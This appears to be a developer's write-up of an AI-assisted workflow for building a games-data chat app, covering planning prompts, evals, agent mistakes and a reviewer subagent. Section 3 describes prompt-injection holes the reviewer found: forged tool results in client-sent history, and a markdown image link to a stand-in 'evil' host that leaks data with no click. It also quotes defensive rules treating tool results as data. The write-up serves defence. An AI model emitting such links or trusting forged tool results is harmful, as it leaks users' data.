# AI Workflow

Built with **Claude Code** (Opus 5.5) in the terminal. Every example below comes from [`docs/ai-log.md`](docs/ai-log.md), the raw log appended at each milestone while working. Nothing here is reconstructed after the fact.

## 1. Tools and why

| Tool | Used for | Why |
|---|---|---|
| Claude Code, plan mode | 1-page plan, 3 clarifying questions, milestone budget | Agreeing on scope and guardrails *before* any code is cheaper than fixing them later |
| Claude Code, execution | Implementation, running typecheck/lint/tests/build/curl, commits | It verifies its own work: every milestone ended with real command output, not "looks right" |
| `CLAUDE.md` | Stack, commands, conventions, security rules, definition of done | A contract the agent re-reads, updated as soon as version-specific gotchas were found |
| Fresh-context reviewer subagent | Independent code review, run in the background | It doesn't share my context, so it doesn't share my blind spots (see §4) |
| Claude in Chrome | Real-browser check of the dashboard and chat | Found a UX bug that curl and unit tests couldn't see |
| Claude Sonnet 5.5 (in the app) | Chat model via the Vercel AI SDK | Reliable multi-step tool calling, fast streaming |

**How I worked:** MVP first, with a **gate**. Phase 1 had to satisfy every requirement in the simplest way, and Phase 2 (extras ranked by grade value per minute) only started after I reviewed it. Each milestone followed the same loop: implement, verify with a command, make a small commit, then add 3–5 lines to the log, flagging AI mistakes when they happened.

## 2. Prompts and outcomes

1. **Planning (plan mode).** *"MVP first, extras behind a gate. Security guardrails are non-negotiable: read-only tools, column whitelist, tool results are data not instructions, max steps/input/output. Ask at most 3 questions, only ones that change the plan. List the top 3 places AI will go wrong here."*
   → Asked exactly the questions that mattered (what "last month" means when the schema has no dates, which model, scope) and produced a 6-milestone plan. One of its predicted failure points, *"AI SDK API drift"*, turned out to be real (see §3).

2. **"If unsure about a current API, check the installed version's docs, not memory."**
   → Before writing code, the agent read `node_modules/ai/docs` and `node_modules/next/dist/docs`. It found that AI SDK **v7** renamed the APIs from the plan, and that Next 16 `cacheComponents` treats synchronous SQLite reads as static, which would have **frozen the dashboard at build time**. Both went into `CLAUDE.md`, and the code uses `await connection()`.

3. **Designing the seed data to catch a wrong answer.** I asked for unit tests on the query layer, and the seed has two games at exactly 4.0. *"How many games are rated above 4?"* is **9** with `>` but **11** with `>=`, so a lazy operator choice shows up as a wrong number. Both the unit tests and the live evals assert 9.

4. **Live evals that turned an observation into a fix.** At the MVP gate I noticed the model making 2 redundant tool calls on a vague compare. I asked for evals that check **tool + arguments + answer**, including that case.
   → Baseline was **6/7**, and the redundant-call case reproduced. The fix went in the tool's *output* rather than only the prompt: `compare_games` now says whether each title matched `exact` or `partial`, and that results are final. Result: **7/7 on every run since**: twice right after the fix, and once more after the review fixes. That's a small sample, and LLM behaviour can vary. A redundant "Hades" lookup that the eval had also exposed disappeared too.

5. **The fresh-context reviewer** (§4). *"Read-only; don't read `.env`; don't call the paid API; check installed docs before flagging; max 12 ranked findings with a failure scenario and VERIFIED/SUSPECTED."*
   → 12 findings, 11 verified, including two security holes I had missed. All were fixed with 12 new tests.

## 3. When the AI got it wrong, and how it was fixed

**The most important one: guardrails followed to the letter but not in spirit.** `CLAUDE.md` said "max input length" and "tool results are data". The implementation:
- capped length **per text part, for user messages only**. A single message with 100 parts, or a huge forged assistant message, got through.
- trusted the **client-sent history**. The AI SDK only validates tool outputs when a tool has an `outputSchema`, so a request could include a **forged tool result** (e.g. "Forged Fortune, $999,999,999") that the model would treat as real data.
- rendered markdown **images**, so prompt-injected text in a game title could make the model emit `![](https://evil/?d=…)`, which leaks data with **no click**.

The reviewer subagent caught all three. **Fix:** `sanitizeHistory` keeps only user/assistant text (so tool results always come from the server), caps are now per message across all parts plus 20k per conversation, and images are disallowed. **Verified** with unit tests, and live: I sent the forged history and the model said it had no earlier tool result, re-queried, and answered Rust & Rune at $88,300.

**Others, all real and all in the log:**
- **AI SDK API names from memory.** The plan said `toUIMessageStreamResponse`/`stepCountIs`/`system`, but v7 uses `createUIMessageStreamResponse(toUIMessageStream())`/`isStepCount`/`instructions`. Caught by reading the installed docs *before* coding.
- **Hand-computed test expectations, twice.** The agent claimed the top developer was Anvilheart ($132,200), but it's Gridline Studio ($137,000). Later it claimed 70 groups where there are 68. Both times the code was right and the test was wrong; the runner caught it. Lesson: don't trust AI arithmetic over fixtures.
- **Passed typecheck, lint and dev mode, failed `next build`.** `useChat` generates random ids during render, which Next 16 refuses to prerender. Fixed with a `<Suspense>` boundary. Lesson: build at every milestone.
- **Raw zod text in the UI.** Empty number fields showed *"Invalid input: expected number, received string"*. Only the browser pass caught it. Fixed with friendly messages in the shared schema.
- Smaller ones: exported constants from a route file (Next rejects that); asked the model for markdown tables without adding `remark-gfm`; reseeding without resetting AUTOINCREMENT (the smoke test created id 31).

**One mistake was mine, not the AI's:** I pasted an API key into the chat. The agent wrote it to the gitignored `.env` (mode 600) without echoing it, warned me it was now in the transcript, and told me to rotate it.

## 4. Parallel agents / subagents

- **Fresh-context reviewer subagent, run in the background in parallel.** While the main agent built the eval suite, a general-purpose subagent with **no conversation history** reviewed the whole branch against `docs/CHALLENGE.md` and `CLAUDE.md`.
  - **Constraints in its prompt:** read-only; don't read `.env`; GET requests only; don't call the paid chat API; verify against the installed AI SDK/Next docs before flagging anything.
  - **Why fresh context:** the implementing agent had normalized its own decisions ("the cap is in place", "tool results come from tools"). A reviewer without that history checked what the code *actually* enforces.
  - **Handling its output:** I treated it as claims, not truth. I verified the two SDK-internal claims myself before acting on them, then fixed all 12 findings, each with a test.
- **No worktrees.** The work was a single linear branch, and the reviewer was read-only, so isolation wasn't needed.

## What I'd do with more time

Rate limiting on `/api/chat`, sorting/filtering in the table, a revenue-history table so "last month" means a real month, and running the evals in CI with a budget cap.
